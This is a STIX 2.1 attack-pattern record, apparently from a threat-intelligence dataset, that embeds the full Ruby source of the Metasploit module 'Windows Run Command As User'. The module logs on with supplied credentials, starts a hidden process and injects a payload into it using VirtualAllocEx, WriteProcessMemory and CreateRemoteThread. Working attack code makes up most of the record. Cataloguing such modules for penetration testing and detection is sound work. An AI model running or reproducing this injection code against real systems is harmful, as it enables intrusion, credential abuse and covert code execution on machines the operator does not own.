{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f840a049-da26-4c59-a718-b3cfd25830c8",
    "created": "2024-08-14T16:49:52.290262Z",
    "modified": "2024-08-14T16:49:52.290266Z",
    "name": "\"Windows Run Command As User\"",
    "description": " This module will login with the specified username/password and execute the supplied command as a hidden process. Output is not returned by default. Unless targeting a local user either set the DOMAIN, or specify a UPN user format (e.g. user@domain). This uses the CreateProcessWithLogonW WinAPI function.  A custom command line can be sent instead of uploading an executable. APPLICAITON_NAME and COMMAND_LINE are passed to lpApplicationName and lpCommandLine respectively. See the MSDN documentation for how these two values interact.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/run_as.rb",
            "external_id": "run_as.rb"
        },
        {
            "source_name": "reference",
            "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/ms682431"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n  include Msf::Post::Windows::Runas\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Windows Run Command As User\",\n        'Description' => %q{\n          This module will login with the specified username/password and execute the\n          supplied command as a hidden process. Output is not returned by default.\n          Unless targeting a local user either set the DOMAIN, or specify a UPN user\n          format (e.g. user@domain). This uses the CreateProcessWithLogonW WinAPI function.\n\n          A custom command line can be sent instead of uploading an executable.\n          APPLICAITON_NAME and COMMAND_LINE are passed to lpApplicationName and lpCommandLine\n          respectively. See the MSDN documentation for how these two values interact.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Kx499', 'Ben Campbell'],\n        'Targets' => [\n          [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          [ 'URL', 'https://msdn.microsoft.com/en-us/library/windows/desktop/ms682431' ]\n        ],\n        'DisclosureDate' => '1999-01-01',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    ) # Same as psexec -- a placeholder date for non-vuln 'exploits'\n\n    register_options(\n      [\n        OptString.new('DOMAIN', [false, 'Domain to login with' ]),\n        OptString.new('USER', [true, 'Username to login with' ]),\n        OptString.new('PASSWORD', [true, 'Password to login with' ]),\n        OptString.new('APPLICATION_NAME', [false, 'Application to be executed (lpApplicationName)', nil ]),\n        OptString.new('COMMAND_LINE', [false, 'Command line to execute (lpCommandLine)', nil ]),\n        OptBool.new('USE_CUSTOM_COMMAND', [true, 'Specify custom APPLICATION_NAME and COMMAND_LINE', false ])\n      ]\n    )\n  end\n\n  def exploit\n    fail_with(Failure::BadConfig, 'Must be a meterpreter session') unless session.type == 'meterpreter'\n    fail_with(Failure::NoAccess, 'Cannot use this technique as SYSTEM') if is_system?\n    domain = datastore['DOMAIN']\n    user = datastore['USER']\n    password = datastore['PASSWORD']\n\n    if datastore['USE_CUSTOM_COMMAND']\n      application_name = datastore['APPLICATION_NAME']\n      command_line = datastore['COMMAND_LINE']\n    else\n      command_line = nil\n      windir = get_env('windir')\n\n      unless session.arch == payload.arch.first\n        fail_with(Failure::BadConfig, 'The payload architecture must match the current session architecture.')\n      end\n      # The notepad process to spaw needs to have the same architecture than the payload\n      application_name = get_notepad_pathname(payload.arch.first, get_env('windir'), sysinfo['Architecture'])\n    end\n\n    pi = create_process_with_logon(domain,\n                                   user,\n                                   password,\n                                   application_name,\n                                   command_line)\n\n    return unless pi\n\n    begin\n      return if datastore['USE_CUSTOM_COMMAND']\n\n      vprint_status('Injecting payload into target process')\n      raw = payload.encoded\n\n      process_handle = pi[:process_handle]\n\n      virtual_alloc = session.railgun.kernel32.VirtualAllocEx(process_handle,\n                                                              nil,\n                                                              raw.length,\n                                                              'MEM_COMMIT|MEM_RESERVE',\n                                                              'PAGE_EXECUTE_READWRITE')\n\n      address = virtual_alloc['return']\n      fail_with(Failure::Unknown, \"Unable to allocate memory in target process: #{virtual_alloc['ErrorMessage']}\") if address == 0\n\n      write_memory = session.railgun.kernel32.WriteProcessMemory(process_handle,\n                                                                 address,\n                                                                 raw,\n                                                                 raw.length,\n                                                                 4)\n\n      fail_with(Failure::Unknown,\n                \"Unable to write memory in target process @ 0x#{address.to_s(16)}: #{write_memory['ErrorMessage']}\") unless write_memory['return']\n\n      create_remote_thread = session.railgun.kernel32.CreateRemoteThread(process_handle,\n                                                                         nil,\n                                                                         0,\n                                                                         address,\n                                                                         nil,\n                                                                         0,\n                                                                         4)\n      if create_remote_thread['return'] == 0\n        print_error(\"Unable to create remote thread in target process: #{create_remote_thread['ErrorMessage']}\")\n      else\n        print_good(\"Started thread in target process\")\n      end\n    ensure\n      session.railgun.kernel32.CloseHandle(pi[:process_handle])\n      session.railgun.kernel32.CloseHandle(pi[:thread_handle])\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "1999-01-01"
}